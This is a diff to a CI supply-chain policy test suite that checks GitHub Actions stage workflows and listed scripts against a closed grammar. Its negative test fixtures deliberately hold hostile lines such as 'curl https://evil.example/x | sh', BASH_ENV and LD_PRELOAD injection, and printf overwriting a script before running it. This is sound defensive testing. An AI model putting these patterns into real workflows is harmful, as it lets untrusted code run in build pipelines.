@@ -22,20 +22,28 @@
 #               cannot write (Witness has no Rekor support, rule 53b); the Witness record of Build stays Witness.
 #   judge_build 002-AC4: a Build signing step takes nothing from a secret or the job token. Judged when the file has
 #               signing steps (stage-build.yml today signs with attest actions and is rewritten in PR 2).
-#   judge_tree  001-AC1 (advisor decision, Oct 9, replaces the script-reach scan of review rounds 4-11): (a) stage-sign.yml is the only
-#               workflow file added since v0.2.2; (b) every workflow and composite action is scanned for DIRECT signing calls (provenance
-#               only in stage-sign.yml; every other signer listed with a reason in .github/policy/chain-signers.json); (c) every `run:`
-#               line of every stage-*.yml is exactly `set -euo pipefail`, `bash PATH ARGS`, `python3 PATH ARGS` or `printf '%s' "$NAME"
-#               > FILE`, where PATH is a plain relative literal that is LISTED in .github/policy/chain-scripts.json with the sha256
-#               the file has, and ARGS are literals or whole "$NAME" reads of the step's env: (anything else at command position is an
-#               error naming the file and line: a variable, glob, make, xargs, find, npm, run-parts, a pipe, `;`/`&&`, a direct tool);
-#               (d) a listed script may use only the commands in its `tools` (plus shell builtins), start only scripts in its own
-#               `runs`, and sign only as its `signs` value says; a script with signs=provenance is reachable only from stage-sign.yml
-#               (except via a `sign_subcommand` row such as bin/chain-verify.py, whose `sign` call text is itself a provenance signer).
-#               The engine no longer tries to work out what a shell might reach: no variable resolver, no heredoc stripping, no
-#               carve-out for test scripts, no ci.yml pins (rounds 4-11 found a new plain form nearly every round; a finite grammar
-#               has none to find). On the real repo this judge is RED until PRs 2-4 replace the old stage files with grammar-conforming
-#               ones and add chain-scripts.json.
+#   judge_tree  001-AC1 (advisor decision b, Oct 9; FINITE GRAMMAR; replaces the script-reach scan of review rounds 4-11): (a) stage-sign.yml
+#               is the only workflow file added since v0.2.2; (b) every workflow and composite action is scanned for DIRECT signing calls
+#               (provenance only in stage-sign.yml; every other signer listed with a reason in .github/policy/chain-signers.json);
+#               (c) every stage-*.yml is judged over a CLOSED KEY SET: workflow keys (name, on, permissions, jobs), job keys (no
+#               defaults, container, services, env, uses, secrets; strategy only a matrix of literal labels), step keys (no shell,
+#               working-directory, continue-on-error); step env names only from the closed `env_names` list of chain-scripts.json (never
+#               BASH_ENV, ENV, PATH, LD_*, PYTHON*, NODE_*, GITHUB_*) and each read whole; step `uses` only a digest-pinned
+#               actions/checkout (persist-credentials: false, no ref/repository/path/token), download-artifact (explicit path that cannot
+#               overwrite a listed script, bin/ or .github/) or upload-artifact (no local composite action, docker://, github-script, job-level
+#               reusable call); and every `run:` line is exactly `set -euo pipefail`, `bash PATH ARGS`, `python3 PATH ARGS` or
+#               `printf '%s' "$NAME" > digests.json` (any other printf line is an error), PATH a plain relative literal LISTED in
+#               .github/policy/chain-scripts.json with the sha256 the file has, ARGS literals or whole "$NAME" reads of the step's env:
+#               (anything else at command position is an error naming file and line: a variable, glob, make, xargs, find, npm, run-parts,
+#               a pipe, `;`/`&&`, a direct tool); (d) a LISTED script is NOT parsed: scan_script is a conservative text scan over the raw
+#               file (any extension or shebang): a command from the finite DENY list not in its `tools`, another script not in its `runs`,
+#               `witness run ... --` followed by anything but a literal path in `runs`, setting PATH/BASH_ENV/LD_*/PYTHON*; its signing calls
+#               are judged from the row's `signs` on the raw text (comments, quotes, heredocs included); a signs=provenance script is
+#               reachable only from stage-sign.yml (except via a `sign_subcommand` row such as bin/chain-verify.py, whose `sign` call text
+#               is itself a provenance signer). STATED EXCLUSION: a command or script path built at run time inside a listed script is not
+#               detected; listed scripts are committed, sha256-bound and reviewed at PR time (row 78). No variable resolver, heredoc
+#               stripping, glob/make following, carve-out for test scripts or ci.yml pins remains. On the real repo this judge is RED
+#               until PRs 2-4 replace the old stage files with grammar-conforming ones and add chain-scripts.json.
 #   (shared)    the signer table bin/chain-test-signers.json is read by this test and by chain-records-test.sh, so the two cannot
 #               disagree about what a signer is; comments are stripped before matching (a trailing `# verify` exempts nothing).
 # Stated exclusions: a signer reached only through an argv array in script code (exec.exec('cosign', ['sign'])), a python/js
@@ -62,7 +70,7 @@ _spec = importlib.util.spec_from_file_location("chain_test_signers", os.path.joi
 _cts = importlib.util.module_from_spec(_spec); _spec.loader.exec_module(_cts)
 TABLE = _cts.load_table()
 strip, logical = _cts.strip, _cts.logical
-def signer_calls(text): return _cts.signer_calls(text, TABLE)
+def signer_calls(text, strip_comments=True): return _cts.signer_calls(text, TABLE, strip_comments)
 
 R_PRINTF = r"printf '%s' \"\$DIGESTS\" > digests\.json"
 R_INSTALL = r"bash bin/install-scanner\.sh cosign"
@@ -164,11 +172,12 @@ def judge_build(path):
     return bad
 
 def judge_tree(base):
-    """001-AC1 (advisor decision, Oct 9, replaces the script-reach scan): (a) stage-sign.yml is the only new workflow file; (b) the
-    direct signer-call scan of every workflow and composite action (listed with a reason in chain-signers.json; provenance only in
-    stage-sign.yml); (c) every `run:` line of every stage-*.yml follows the grammar and runs only LISTED scripts (chain-scripts.json,
-    by path and sha256); (d) every listed script uses only its tools, starts only its `runs`, and signs only as its row says; a
-    provenance signer is reachable only from stage-sign.yml."""
+    """001-AC1 (advisor decision b, Oct 9; finite grammar, replaces the script-reach scan): (a) stage-sign.yml is the only new workflow
+    file; (b) the direct signer-call scan of every workflow and composite action (listed with a reason in chain-signers.json;
+    provenance only in stage-sign.yml); (c) every stage-*.yml is judged over a closed key set, a closed `uses` list, a closed env name
+    set and the run-line grammar, running only LISTED scripts (chain-scripts.json, by path and sha256); (d) every listed script gets
+    the conservative text scan (tools, runs, launcher argv, PATH-like assignments) and signs only as its row says; a provenance
+    signer is reachable only from stage-sign.yml."""
     bad = []
     known = set("""acceptance.yml agent-review-gate.yml auditor.yml ci.yml codeql.yml dependabot-auto-merge.yml dependabot-reviewer.yml
 go-freshness.yml main-candidate-rescan.yml release.yml reserved-branch-guard.yml scan.yml scorecard.yml
@@ -198,7 +207,7 @@ stage-verify.yml supply-chain.yml""".split())
     for f in files + sorted(acts):
         rel = os.path.relpath(f, wfdir) if f in files else os.path.relpath(f, base)
         check(rel, open(f).read())
-    rows, errs = _cts.load_scripts(base)
+    rows, errs, envn = _cts.load_scripts(base)
     bad += ["AC1: " + e for e in errs]
     ran = {}
     for f in files:
@@ -206,7 +215,7 @@ stage-verify.yml supply-chain.yml""".split())
         if not rel.startswith("stage-"): continue
         try: d = yaml.load(open(f).read(), Loader=yaml.BaseLoader) or {}
         except Exception as e: bad.append("AC1: %s does not parse (%s)" % (rel, e)); continue
-        e, r = _cts.stage_grammar(rel, d, rows)
+        e, r = _cts.stage_grammar(rel, d, rows, envn)
         bad += ["AC1 grammar: " + x for x in e]; ran[rel] = set(r)
     def closure(paths):
         seen, todo = set(), list(paths)
@@ -218,9 +227,9 @@ stage-verify.yml supply-chain.yml""".split())
     reach = {rel: closure(p) for rel, p in ran.items()}
     for p, row in sorted(rows.items()):
         text = open(os.path.join(base, p), errors="replace").read()
-        bad += ["AC1: " + x for x in _cts.check_script(p, text, row, rows)]
+        bad += ["AC1: " + x for x in _cts.scan_script(p, text, row, rows, base)]
         signs = row.get("signs", False)
-        for e, pv, line in signer_calls(text):
+        for e, pv, line in signer_calls(text, False):      # raw text: a signer name in a comment, quote or heredoc counts
             if pv and signs != "provenance": bad.append("AC1: %s signs provenance (%s) but its row says signs=%r" % (p, e["name"], signs))
             elif not pv and not signs: bad.append("AC1: %s calls %s but its row says it signs nothing" % (p, e["name"]))
         if signs == "provenance" and not row.get("sign_subcommand"):
@@ -397,7 +406,7 @@ d = sys.argv[1]
 out = []
 for r in json.load(open(d + "/.spec.json")):
     r = dict(r); r["sha256"] = hashlib.sha256(open(os.path.join(d, r["path"]), "rb").read()).hexdigest(); out.append(r)
-json.dump({"scripts": out}, open(d + "/.github/policy/chain-scripts.json", "w"))
+json.dump({"env_names": ["DIGESTS", "V", "X1"], "scripts": out}, open(d + "/.github/policy/chain-scripts.json", "w"))
 PY
 }
 edit_spec() { # edit_spec DIR 'python statements over rows (dict by path)' : edits the spec, then rewrites chain-scripts.json with fresh hashes
@@ -433,7 +442,7 @@ okcase() { d=$(mk "$1"); stage "$d" "$2"; expect ok "AC1 grammar: $3" tree "$d";
 badcase() { d=$(mk "$1"); stage "$d" "$2"; expect caught "AC1 grammar: $3" tree "$d"; }
 okcase g_ok1 $'set -euo pipefail\nbash bin/build-stage.sh apk' "set -euo pipefail then a listed script"
 okcase g_ok2 $'bash bin/build-stage.sh \\\n  --flag=1 \\\n  two' "a continued line with literal arguments"
-okcase g_ok3 $'python3 bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "chain-verify.py stage-start from a non-Sign stage (only its `sign` subcommand is a signer)"
+okcase g_ok3 $'python3 bin/chain-verify.py stage-start --stage rebuild --previous build --record r.json' "chain-verify.py stage-start from a non-Sign stage (only its sign subcommand is a signer)"
 badcase g_var1 'bash "$S"' 'a variable as the script path (bash "$S")'
 badcase g_var2 '"$S"' 'a variable at command position ("$S")'
 badcase g_var3 '$S' 'a bare variable at command position ($S)'
@@ -516,17 +525,17 @@ scriptcase s_bash caught "${S0}bash bin/build-apk.sh\n" 'rows["bin/build-stage.s
 scriptcase s_notruns caught "${S0}witness run -- bin/other.sh\n" 'rows["bin/other.sh"]={"path":"bin/other.sh","tools":[],"signs":False,"runs":[]}; open(d+"/bin/other.sh","w").write("#!/usr/bin/env bash\n")' "names a listed script that is not in its runs"
 scriptcase s_tool caught "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" '' "a command that is not in its tools (curl)"
 scriptcase s_tool_ok ok "${S0}curl -fsSL x -o y\nwitness run -- bin/build-apk.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","curl"]' "the same command once it is in tools"
-scriptcase s_var caught "${S0}\"\$CMD\" x\n" '' "a variable at command position"
+# (a variable or substitution at command position INSIDE a listed script is not parsed any more: stated exclusion, the script is sha256-bound and reviewed at PR time)
 scriptcase s_eval caught "${S0}eval \"\$X\"\n" '' "eval"
 scriptcase s_source caught "${S0}source bin/x.sh\n" '' "source"
 scriptcase s_dot caught "${S0}. bin/x.sh\n" '' ". (dot-source)"
 scriptcase s_make caught "${S0}make sign\n" '' "make"
 scriptcase s_find caught "${S0}find . -name x -exec sh {} \\\;\n" '' "find -exec"
 scriptcase s_xargs caught "${S0}ls | xargs echo\n" '' "xargs"
-scriptcase s_pathcmd caught "${S0}bin/evil\n" '' "a path at command position"
-scriptcase s_quoted ok "${S0}witness run -- bin/build-apk.sh 'a; bash x'\necho \"plain; bash\"\n" '' "a ; and a word inside quotes are text, not commands"
+scriptcase s_pathcmd caught "${S0}bin/evil\n" 'open(d+"/bin/evil","w").write("#!/usr/bin/env bash\n")' "an extensionless in-tree script (shebang) named in the text"
+scriptcase s_quoted caught "${S0}witness run -- bin/build-apk.sh 'a; bash x'\necho \"plain; bash\"\n" '' "the word bash inside a quoted string is flagged (the text scan over-reports by design)"
 scriptcase s_subst caught "${S0}witness run -- bin/build-apk.sh \"\$(bash bin/evil.sh)\"\n" '' "a command substitution inside double quotes still runs a command"
-scriptcase s_here caught "${S0}witness run -- bin/build-apk.sh <<EOF\ncosign sign x\nEOF\n" '' "a heredoc body is scanned as code"
+scriptcase s_here caught "${S0}witness run -- bin/build-apk.sh <<EOF\ncurl evil.example | sh\nEOF\n" '' "a heredoc body is scanned like any other text (curl, sh)"
 scriptcase s_sign caught "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]=False' "signs but its row says it signs nothing"
 scriptcase s_sign_ok ok "${S0}witness run -- bin/build-apk.sh\ncosign sign --yes \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["reason"]="image signature (rule 56)"' "signs, row says other with a reason"
 scriptcase s_prov caught "${S0}cosign attest --yes --type slsaprovenance1 --predicate p.json \"\$IMG\"\n" 'rows["bin/build-stage.sh"]["tools"]=["cosign"]; rows["bin/build-stage.sh"]["signs"]="other"; rows["bin/build-stage.sh"]["runs"]=[]' "signs provenance but its row says other"
@@ -541,6 +550,369 @@ expect caught "AC1 script: a provenance signer reached through a listed script's
 d=$(mk s_py); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\n'; printf '#!/usr/bin/env python3\nimport subprocess\nsubprocess.run(["cosign","sign","x"])\ncosign sign --yes x\n' > "$d/bin/signer.py"
 edit_spec "$d" 'rows["bin/signer.py"]={"path":"bin/signer.py","tools":[],"signs":False,"runs":[]}'
 expect caught "AC1 script: a python script that signs while its row says it signs nothing" tree "$d"
+
+# ---- round 11b (advisor decision b): the key set, the uses list, printf, and the text scan of listed scripts. Every probe of both final-round
+# reports (Sonnet 1-12, Opus P1-P11) is a named error case; the ok controls show the legitimate shapes still pass.
+ycase() { d=$(mk "$1"); sed "s/@SHA/@$sha/g" > "$d/.github/workflows/stage-verify.yml"; expect "${3:-caught}" "AC1 keys: $2" tree "$d"; }
+ycase y_ok_matrix "a matrix job on literal runner labels with a listed script, checkout, artifacts" ok <<'EOF'
+jobs:
+  apk:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      fail-fast: true
+      matrix:
+        runner: [ubuntu-24.04, ubuntu-24.04-arm]
+    steps:
+      - uses: actions/checkout@SHA
+        with:
+          persist-credentials: false
+      - uses: actions/download-artifact@SHA
+        with:
+          name: dist
+          path: dl
+      - run: bash bin/build-stage.sh apk
+      - uses: actions/upload-artifact@SHA
+        with:
+          name: out
+          path: out
+EOF
+ycase y_ok_printf "printf '%s' \"\$NAME\" > digests.json with the name in env_names" ok <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          DIGESTS: ${{ inputs.digests }}
+        run: printf '%s' "$DIGESTS" > digests.json
+EOF
+ycase y_wfdefaults "workflow-level defaults.run.shell (Sonnet 1)" <<'EOF'
+defaults:
+  run:
+    shell: "bash -c 'bash bin/unlisted.sh; bash {0}'"
+jobs:
+  j:
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_jobdefaults "job-level defaults.run.shell (Sonnet 1, Opus P4)" <<'EOF'
+jobs:
+  j:
+    defaults:
+      run:
+        shell: "bash -c 'bash bin/unlisted.sh; bash {0}'"
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_wfdefaults_wd "workflow-level defaults.run.working-directory (Opus P4b)" <<'EOF'
+defaults:
+  run:
+    working-directory: evil
+jobs:
+  j:
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_wfenv "workflow-level env BASH_ENV (Sonnet 3)" <<'EOF'
+env:
+  BASH_ENV: bin/unlisted.sh
+jobs:
+  j:
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_jobenv "job-level env (Opus B3)" <<'EOF'
+jobs:
+  j:
+    env:
+      X1: y
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_bashenv "step env BASH_ENV carrying code (Sonnet 3, Opus P3)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          BASH_ENV: bin/evil.sh
+        run: bash bin/build-stage.sh a
+EOF
+ycase y_path "step env PATH: ./bin (Sonnet 4)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          PATH: ./bin
+        run: bash bin/build-stage.sh a
+EOF
+ycase y_pythonpath "step env PYTHONPATH (Opus P10)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          PYTHONPATH: evil
+        run: python3 bin/chain-verify.py stage-start --stage rebuild
+EOF
+ycase y_ldpreload "step env LD_PRELOAD" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          LD_PRELOAD: bin/evil.so
+        run: bash bin/build-stage.sh a
+EOF
+ycase y_envname "step env name not in the closed env_names list" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          FOO: bar
+        run: bash bin/build-stage.sh "$FOO"
+EOF
+ycase y_envunread "step env key the run line does not read whole" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          V: ${{ inputs.v }}
+        run: bash bin/build-stage.sh a
+EOF
+ycase y_composite "uses: ./.github/actions/x, a local composite action (Sonnet 5, Opus P5)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: ./.github/actions/x
+EOF
+ycase y_docker "uses: docker://alpine (Sonnet 6)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: docker://alpine
+EOF
+ycase y_ghscript "a digest-pinned actions/github-script whose script runs a program (Sonnet 12)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/github-script@SHA
+        with:
+          script: require('child_process').execSync('bin/unlisted.sh')
+EOF
+ycase y_unpinned "an unpinned action" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: false
+EOF
+ycase y_jobuses "a job-level reusable-workflow call to ci.yml (Sonnet 7, Opus P9)" <<'EOF'
+jobs:
+  j:
+    uses: ./.github/workflows/ci.yml
+EOF
+ycase y_container "job container: (Sonnet 11, Opus P11)" <<'EOF'
+jobs:
+  j:
+    container: alpine
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_services "job services:" <<'EOF'
+jobs:
+  j:
+    services:
+      db:
+        image: postgres
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_continue "step continue-on-error" <<'EOF'
+jobs:
+  j:
+    steps:
+      - continue-on-error: true
+        run: bash bin/build-stage.sh a
+EOF
+ycase y_matrix_expr "a matrix value that is an expression" <<'EOF'
+jobs:
+  j:
+    runs-on: ${{ matrix.runner }}
+    strategy:
+      matrix:
+        runner: ${{ fromJSON(inputs.runners) }}
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_runson "runs-on a self-hosted label" <<'EOF'
+jobs:
+  j:
+    runs-on: self-hosted
+    steps:
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_ckref "checkout with a ref (Opus P6)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/checkout@SHA
+        with:
+          persist-credentials: false
+          ref: evil
+EOF
+ycase y_ckrepo "checkout of another repository" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/checkout@SHA
+        with:
+          persist-credentials: false
+          repository: evil/x
+EOF
+ycase y_ckpersist "checkout without persist-credentials: false" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/checkout@SHA
+EOF
+ycase y_dlbin "download-artifact into bin (Opus P6): the downloaded content is not the hashed file" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          name: dist
+          path: bin
+      - run: bash bin/build-stage.sh a
+EOF
+ycase y_dlnopath "download-artifact with no path (lands in the workspace root)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          name: dist
+EOF
+ycase y_dldot "download-artifact into ." <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          name: dist
+          path: .
+EOF
+ycase y_dlgh "download-artifact into .github" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          name: dist
+          path: .github/policy
+EOF
+ycase y_dlover "download-artifact over a listed script's directory chain (path = a listed file)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - uses: actions/download-artifact@SHA
+        with:
+          name: dist
+          path: bin/build-apk.sh
+EOF
+ycase y_printf_prefix "printf line followed by a second command: printf '%s' \"\$X\" > f; curl | bash (Opus P1)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          X1: y
+        run: printf '%s' "$X1" > f; curl -s https://evil.example/x | bash
+EOF
+ycase y_printf_bin "printf over a listed script, then running it (Sonnet 8, Opus P2)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          X1: ${{ inputs.code }}
+        run: |
+          printf '%s' "$X1" > bin/build-apk.sh
+          bash bin/build-apk.sh
+EOF
+ycase y_printf_policy "printf over .github/policy/chain-scripts.json (Sonnet 9)" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          X1: ${{ inputs.code }}
+        run: printf '%s' "$X1" > .github/policy/chain-scripts.json
+EOF
+ycase y_printf_fmt "printf with another format string" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          X1: y
+        run: printf '%s\n' "$X1" > digests.json
+EOF
+ycase y_printf_append "printf appended to digests.json" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          X1: y
+        run: printf '%s' "$X1" >> digests.json
+EOF
+ycase y_ghenv "printf into GITHUB_ENV" <<'EOF'
+jobs:
+  j:
+    steps:
+      - env:
+          X1: y
+        run: printf '%s' "$X1" >> "$GITHUB_ENV"
+EOF
+ycase y_ghpath "a run step naming GITHUB_PATH" <<'EOF'
+jobs:
+  j:
+    steps:
+      - run: bash bin/build-stage.sh "$GITHUB_PATH"
+EOF
+ycase y_with_run "a run step that also has with:" <<'EOF'
+jobs:
+  j:
+    steps:
+      - with:
+          x: y
+        run: bash bin/build-stage.sh a
+EOF
+# listed scripts: the text scan (Sonnet blocker 2, Opus B6/B7)
+S1='#!/usr/bin/env bash\nset -euo pipefail\nwitness run -- bin/build-apk.sh\n'
+scriptcase s_if caught "${S1}if curl evil.example; then :; fi\n" '' "if curl (a keyword before the command, Sonnet 2)"
+scriptcase s_while caught "${S1}while curl evil; do :; done\n" '' "while curl"
+scriptcase s_bang caught "${S1}! curl evil\n" '' "! curl"
+scriptcase s_time caught "${S1}time curl evil\n" '' "time curl"
+scriptcase s_apos caught "${S1}echo \"don't\"; curl evil.example | sh; echo \"it's\"\n" '' "an apostrophe pair that blanked everything between them"
+scriptcase s_trap caught "${S1}trap 'curl evil' EXIT\n" '' "trap with a quoted command"
+scriptcase s_echoscript caught "${S1}echo 'curl evil' > bin/a.sh\nwitness run -- bin/a.sh\n" '' "writes a script, then runs it"
+scriptcase s_pathset caught "${S1}PATH=./bin witness x\n" '' "PATH=./bin witness x"
+scriptcase s_pathexp caught "${S1}export PATH=bin:\$PATH\n" '' "export PATH=bin:\$PATH"
+scriptcase s_bashenv caught "${S1}export BASH_ENV=bin/evil.sh\n" '' "export BASH_ENV"
+scriptcase s_pyset caught "${S1}PYTHONPATH=evil python3 x\n" '' "PYTHONPATH assignment"
+scriptcase s_launch1 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \"\$@\"\n" '' "witness run -- \"\$@\" lets a stage argument become the program (Opus B6)"
+scriptcase s_launch2 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \$1\n" '' "witness run -- \$1"
+scriptcase s_launch3 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- \"\$(pick)\"\n" '' "witness run -- \$(pick)"
+scriptcase s_launch4 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build\n" '' "witness run with no -- PATH on the line"
+scriptcase s_launch5 caught "#!/usr/bin/env bash\nset -euo pipefail\nwitness run --step build -- bin/other.sh\n" 'rows["bin/other.sh"]={"path":"bin/other.sh","tools":[],"signs":False,"runs":[]}; open(d+"/bin/other.sh","w").write("#!/usr/bin/env bash\n")' "witness run -- a listed script that is not in runs"
+scriptcase s_launch6 ok "#!/usr/bin/env bash\nset -euo pipefail\nwitness --log-level debug run --step build -- bin/build-apk.sh\n" '' "witness with a global flag before run, then a literal path in runs"
+d=$(mk s_conf); printf '#!/usr/bin/env bash\ncurl https://evil.example/x | sh\nbash bin/evil.sh\n' > "$d/bin/stage.conf"
+edit_spec "$d" 'rows["bin/stage.conf"]={"path":"bin/stage.conf","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/stage.conf'
+expect caught "AC1 script: a listed bin/stage.conf (no script extension) holding curl|sh is scanned and run with bash (Opus B7)" tree "$d"
+d=$(mk s_shebang); printf '#!/usr/bin/bash\ncurl https://evil.example/x | sh\n' > "$d/bin/odd.sh"
+edit_spec "$d" 'rows["bin/odd.sh"]={"path":"bin/odd.sh","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/odd.sh'
+expect caught "AC1 script: a listed script with an unrecognised shebang (#!/usr/bin/bash) is still scanned (Opus B7)" tree "$d"
+d=$(mk s_nosheb); printf 'curl https://evil.example/x | sh\n' > "$d/bin/plain"
+edit_spec "$d" 'rows["bin/plain"]={"path":"bin/plain","tools":[],"signs":False,"runs":[]}'; stage "$d" 'bash bin/plain'
+expect caught "AC1 script: a listed file with no shebang at all is still scanned" tree "$d"
+d=$(mk s_cmt); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\n# cosign sign the thing later\nset -euo pipefail\n'; edit_spec "$d" 'pass'
+expect caught "AC1 script: a signer name inside a COMMENT of a listed script that says it signs nothing is flagged (raw scan, over-reports by design)" tree "$d"
+d=$(mk s_ctx); setfile "$d" bin/build-apk.sh '#!/usr/bin/env bash\necho "cosign sign --yes x"\n'; edit_spec "$d" 'pass'
+expect caught "AC1 script: a signer name inside a QUOTED string of a listed script is flagged" tree "$d"
 
 # direct signer calls in NON-stage workflows and composite actions (the grammar does not apply there, so these isolate the signer table)
 d=$(mk t_prov); printf 'jobs:\n  b:\n    steps:\n      - uses: actions/attest-build-provenance@%s\n' "$sha" > "$d/.github/workflows/stage-build.yml"
@@ -639,7 +1011,7 @@ expect ok "the real stage-sign.yml passes the Sign judge" sign "$root/.github/wo
 expect ok "the real stage-build.yml's signing steps take nothing from a secret" build "$root/.github/workflows/stage-build.yml"
 expect ok "the real tree: only stage-sign.yml is new and only it signs provenance" tree "$root"
 expect ok "the real tree: only release.yml calls stage-sign.yml and no stage calls a stage (003-AC5; green already: scan.yml and main-candidate-rescan.yml are non-stage callers)" calls "$root"
-EXPECT=188
+EXPECT=248
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
